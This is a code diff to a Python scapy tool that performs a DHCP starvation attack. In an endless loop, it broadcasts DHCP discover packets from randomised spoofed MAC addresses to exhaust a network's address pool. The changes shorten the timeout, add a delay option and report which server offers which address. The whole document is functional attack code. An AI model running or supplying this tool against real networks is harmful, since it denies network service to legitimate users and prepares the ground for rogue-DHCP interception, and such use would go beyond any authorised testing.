@@ -1,12 +1,13 @@
 import click
 from scapy.all import ICMP, IP, conf, sr1, UDP, TCP, Ether, BOOTP, DHCP, get_if_raw_hwaddr, RandMAC, srp
-
+from time import sleep
 
 @click.command()
 @click.option('-i', 'iface', default=None, help='Interface to use')
-@click.option('-t', 'timeout', default=5, help='Time (seconds) to wait for responses')
+@click.option('-t', 'timeout', default=1, help='Time (seconds) to wait for responses')
+@click.option('-s', 'sleeptime', default=0, help='Time (seconds) between requests')
 @click.option('-v', 'verbose', is_flag=True, default=False, help='Verbose output')
-def cmd_dhcp_starvation(iface, timeout, verbose):
+def cmd_dhcp_starvation(iface, timeout, sleeptime, verbose):
 
     conf.verb = False
 
@@ -17,19 +18,21 @@ def cmd_dhcp_starvation(iface, timeout, verbose):
 
     ether = Ether(dst="ff:ff:ff:ff:ff:ff")
     ip = IP(src="0.0.0.0",dst="255.255.255.255")
-    udp = UDP(sport=68,dport=67)
+    udp = UDP(sport=68, dport=67)
     dhcp = DHCP(options=[("message-type","discover"),"end"])
 
     while True:
         bootp = BOOTP(chaddr=str(RandMAC()))
         dhcp_discover = ether / ip / udp / bootp / dhcp
-        ans, unans = srp(dhcp_discover, timeout=5)      # Press CTRL-C after several seconds
+        ans, unans = srp(dhcp_discover, timeout=1)      # Press CTRL-C after several seconds
 
         for _, pkt in ans:
             if verbose:
                 print(pkt.show())
             else:
-                print(pkt.summary())
+                print(pkt.sprintf(r"%IP.src% offers %BOOTP.yiaddr%"))
+
+        sleep(sleeptime)
 
 
 if __name__ == '__main__':
